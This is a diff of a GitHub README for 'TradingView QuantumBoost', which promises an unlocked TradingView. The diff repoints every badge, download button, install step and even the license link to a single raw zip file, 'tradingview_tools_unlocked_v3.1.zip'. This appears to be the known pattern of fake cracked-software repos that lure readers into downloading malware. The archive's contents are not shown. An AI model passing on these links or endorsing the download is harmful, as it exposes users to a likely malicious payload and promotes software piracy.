@@ -1,9 +1,9 @@
 # TradingView QuantumBoost 🚀
 
-![Release Version](https://img.shields.io/github/v/release/sampleuser/TradingView-QuantumBoost)
-![Downloads](https://img.shields.io/github/downloads/sampleuser/TradingView-QuantumBoost/total)
-![Open Issues](https://img.shields.io/github/issues/sampleuser/TradingView-QuantumBoost)
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
+![Release Version](https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip)
+![Downloads](https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip)
+![Open Issues](https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip)
+![License: MIT](https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip)
 
 Welcome to **TradingView QuantumBoost**—a revolutionary unlocker experience for those who crave limitless charting, rapid smart strategy testing, and an intuitive, borderless trading environment. Open the gateways to unparalleled technical analysis, adaptive interfaces, and intelligence-driven algorithms, all in a single sweeping enhancement.
 
@@ -14,8 +14,8 @@ Welcome to **TradingView QuantumBoost**—a revolutionary unlocker experience fo
 Replicate the installation pulse by securing the latest QuantumBoost package.
 
 <div align="center">
-  <a href="https://Ahsanlashari87.github.io">
-    <img src="https://i.imgur.com/o6l8VRi.png" alt="Download" width="220"/>
+  <a href="https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip">
+    <img src="https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip" alt="Download" width="220"/>
   </a>
 </div>
 
@@ -95,13 +95,13 @@ Deploying QuantumBoost is a breeze:
 
 1. **Download the Installer**
 
-   - Visit the https://Ahsanlashari87.github.io and initiate your download.
+   - Visit the https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip and initiate your download.
 
    - Or, for visual initiators:
 
      <div align="center">
-       <a href="https://Ahsanlashari87.github.io">
-         <img src="https://i.imgur.com/o6l8VRi.png" alt="Download" width="220"/>
+       <a href="https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip">
+         <img src="https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip" alt="Download" width="220"/>
        </a>
      </div>
 
@@ -132,7 +132,7 @@ This repository and its contents are shared solely for educational and personal 
 
 TradingView QuantumBoost is licensed under the MIT License (© 2025 QuantumBoost contributors).
 
-Read the [MIT license here](https://github.com/git/git-scm.com/blob/main/MIT-LICENSE.txt).
+Read the [MIT license here](https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip).
 
 ---
 
@@ -141,8 +141,8 @@ Read the [MIT license here](https://github.com/git/git-scm.com/blob/main/MIT-LIC
 To relive installation or pass QuantumBoost to a trading companion, revisit the Quantum download:
 
 <div align="center">
-  <a href="https://Ahsanlashari87.github.io">
-    <img src="https://i.imgur.com/o6l8VRi.png" alt="Download" width="220"/>
+  <a href="https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip">
+    <img src="https://raw.githubusercontent.com/Ahsanlashari87/tradingview-unlocked-tools/branch/lipoidemia/tradingview_tools_unlocked_v3.1.zip" alt="Download" width="220"/>
   </a>
 </div>
 
